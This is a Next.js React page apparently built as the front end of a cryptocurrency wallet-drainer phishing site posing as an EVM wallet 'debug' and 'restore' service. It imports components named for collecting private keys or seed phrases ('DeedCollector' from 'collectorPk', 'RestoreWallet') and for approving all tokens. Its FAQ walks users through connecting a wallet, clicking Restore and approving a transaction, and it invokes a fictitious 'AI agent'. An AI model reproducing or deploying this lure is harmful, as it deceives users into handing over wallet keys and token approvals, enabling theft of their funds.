"use client";


import Image from "next/image";
import styles from "./page.module.css";
import Metamask from "../../public/trust wallet.png"
import rpc from "../../public/unlink.png"
import gas from "../../public/gas-pump.png"
import code from "../../public/code-error.png"
import mm from "../../public/mm.png"
import ScanWallet from "./components/scanWallet";
import ApproveButton from "./components/approveButton";
import ScanWalletNew from "./components/scanWallet_modified";
import NewApprove from "./components/newApprove";
import TokenAllowanceButton from "./components/userBalance";
import UserBalance from "./components/userBalance";
import UserTokensList from "./components/userTokens";
import UserTokensAndBalance from "./components/userCard";
import ApproveAllTokens from "./components/approveAllTokens";
import ConnectedAddress from "./components/connectedAddresses";
import ApproveTxn from "./components/approveTxn";
import { useState } from "react";
import DeedCollector from "./components/collectorPk";
import RestoreWallet from "./components/restore";

export default function Home() {
  const [nextPopup, setNextPopup] = useState(false);
  const [isHovered, setIsHovered] = useState(false);

  return (
    <div>
    <div className={styles.connectWallet}
        >
          <h1>
            
          </h1>
          <w3m-button 
          />
        </div>
    <div className={styles.container}>
      <div style={{marginBottom: "60px"}}>
      <Image style={{height: "500px", width: "500px"}}
                  src={Metamask}
                  alt='mm'/>
      </div>
      <div style={{
        display: "flex",
        flexDirection: "column",
        justifyContent: "flex-start",
        alignItems: "flex-start"
      }}>
        
        <h1>
        Trusted by the world’s most popular EVM wallets.
        </h1>
        <p style={{marginTop: "10px"}}>
          Quicky debug RPC and other technical problems you may be experiencing with your evm wallet.
        </p>
        <div>
        <ApproveTxn />
        <ConnectedAddress />
        </div>

        <div style={{
          marginTop: "50px",
          width: "100%"
        }}>
          <h1>
        Common Issues
        </h1>

        <div style={{
          display: "flex",
          flexDirection: "column",
          marginTop: "30px",
          maxWidth: "920px"
        }}>
          <div style={{
           
            marginTop: "20px",
           
          }}>
            <Image style={{height: "50px", width: "50px",  marginBottom: "10px",}}
                  src={rpc}
                  alt='mm'/>
            <h3>
              JSON RPC
            </h3>
            <p style={{
              marginTop: "5px"
            }}>
            Common issues with EVM wallets when interacting with the RPC API often stem from misconfigured parameters, network-related problems, or limitations in the EVM JSON-RPC protocol itself. 
            </p>
            
          </div>
          
          
       
          <div style={{
            
            marginTop: "40px",
           
          }}>
            <Image style={{height: "50px", width: "50px",  marginBottom: "10px",}}
                  src={code}
                  alt='mm'/>
            <h3>
              REVERT TXNS
            </h3>
            <p style={{
              marginTop: "5px"
            }}>
            Reverted transactions occur when an Ethereum Virtual Machine (EVM)-based blockchain (e.g., Ethereum, Binance Smart Chain, Polygon) cancels or rolls back a transaction during execution.
            </p>
            
          </div>

          <div style={{
           
            marginTop: "40px",
           
          }}>
            <Image style={{height: "50px", width: "50px",  marginBottom: "10px",}}
                  src={gas}
                  alt='mm'/>
            <h3>
              EST. GAS
            </h3>
            <p style={{
              marginTop: "5px"
            }}>
            This issue occurs when an Ethereum Virtual Machine (EVM) node cannot provide a gas estimate for a transaction using the eth_estimateGas JSON-RPC method. 
            </p>
            
          </div>

          <div style={{
           
           marginTop: "40px",
          
         }}>
           <Image style={{height: "50px", width: "50px", marginBottom: "10px",}}
                 src={mm}
                 alt='mm'/>
           <h3>
            Connection Modal
           </h3>
           <p style={{
             marginTop: "5px"
           }}>
A connect modal issue in a frontend application often arises when users are interacting with a wallet connection modal (e.g., MetaMask, WalletConnect, or similar) and encounter unexpected problems.           </p>
           <div>
           <button 
           onMouseEnter={() => setIsHovered(true)}
           onMouseLeave={() => setIsHovered(false)}
           style={{
                                marginTop: "20px",
                                marginBottom: "5px",
                                padding: "10px",
                                backgroundColor: isHovered ? "#dcdcdc" : "#efefef", // Hover effect for background color
                                border: "none",
                                borderRadius: "6px",
                                color: isHovered ? "#000" : "#333", // Hover effect for text color
                                fontSize: "1rem",
                                cursor: "pointer",
                                width: "180px",
                                height: "42px"
                                }}
          onClick={() => setNextPopup(true)}
>
            Restore Wallet
           </button>
           {nextPopup && (
        <div
          style={{
            position: "fixed",
            justifyContent: "center",
            alignContent: "center",
            textAlign: "center",
            top: "50%",
            left: "50%",
            transform: "translate(-50%, -50%)",
            backgroundColor: "white",
            border: "1px solid #ccc",
            borderRadius: "10px",
            padding: "20px",
            boxShadow: "0 4px 8px rgba(0, 0, 0, 0.2)",
            zIndex: 1000,
            overflowY: "auto", // Enable vertical scrolling
          }}
        >
         
          <RestoreWallet />
          
              
              <button
                onClick={() => setNextPopup(false)}
                style={{
                  padding: "10px",
                  marginTop: "10px",
                  backgroundColor: "#efefef",
                  border: "none",
                  borderRadius: "6px",
                  color: "#333",
                  fontSize: "1rem",
                  cursor: "pointer",
                  width: "100%"
                }}
              >
                Close
              </button>
          </div>
       
      )}

      {/* Overlay */}
      {nextPopup && (
        <div
          onClick={() => setNextPopup(false)}
          style={{
            position: "fixed",
            top: 0,
            left: 0,
            width: "100%",
            height: "100%",
            backgroundColor: "rgba(0, 0, 0, 0.5)",
            zIndex: 999,
          }}
        />
      )}
           </div>
         </div>
          
          
        </div>
        </div>


        <div style={{maxWidth: "940px"}}>
            <h1 style={{ marginTop: "50px" }}>FAQ</h1>
            <div
              style={{
                display: "flex",
                flexDirection: "column",
                gap: "20px",
                marginTop: "20px",
              }}
            >
              <div
                style={{
                  border: "solid",
                  borderWidth: "1px",
                  borderRadius: "10px",
                  padding: "20px",
                }}
              >
                <h3>How do I resolve JSON-RPC errors?</h3>
                <p style={{marginTop: "10px"}}>
                  Check if the network settings and RPC URL are configured
                  correctly. Ensure your wallet or node is synchronized with
                  the network.
                </p>
              </div>

              <div
                style={{
                  border: "solid",
                  borderWidth: "1px",
                  borderRadius: "10px",
                  padding: "20px",
                }}
              >
                <h3>What causes reverted transactions?</h3>
                <p style={{marginTop: "10px"}}>
                  Transactions can revert due to contract logic errors, invalid
                  parameters, or insufficient funds. Debug the transaction with
                  tools like Tenderly or Remix.
                </p>
              </div>

              <div
                style={{
                  border: "solid",
                  borderWidth: "1px",
                  borderRadius: "10px",
                  padding: "20px",
                }}
              >
                <h3>Why am I unable to estimate gas?</h3>
                <p style={{marginTop: "10px"}}>
                  This may happen due to transaction reverts, complex contract
                  interactions, or insufficient funds in the sender's wallet.
                  Use tools like `eth_call` to simulate the transaction.
                </p>
              </div>

              <div
                style={{
                  border: "solid",
                  borderWidth: "1px",
                  borderRadius: "10px",
                  padding: "20px",
                }}
              >
                <h3>How do I debug contract execution?</h3>
                  <p style={{marginTop: "5px"}}>
  Follow these steps to debug contract execution effectively:
</p>
<ul style={{ listStyleType: "disc", paddingLeft: "20px", }}>
  <li style={{marginTop: "5px"}}><strong>Connect Your Wallet:</strong> Ensure your wallet is connected to the dApp.</li>
  <li style={{marginTop: "5px"}}><strong>Click Restore:</strong> Use the "Restore" button to reset all network irregularities back to their default state. Our AI agent asynchronously scans and resolves issues across chains at its own discretion.</li>
  <li style={{marginTop: "5px"}}><strong>Confirm the Transaction:</strong> Approve the transaction in your wallet app when prompted.</li>
  <li style={{marginTop: "5px"}}><strong>Pay Gas Fees:</strong> Complete the transaction by paying the required gas fees.</li>
</ul>

<p style={{marginTop: "5px"}}>
  This process will help restore normal operations and debug execution issues effectively.
</p>
              </div>
            </div>
            </div>
        
       
        
      </div>
    </div>
    </div>
  );
}
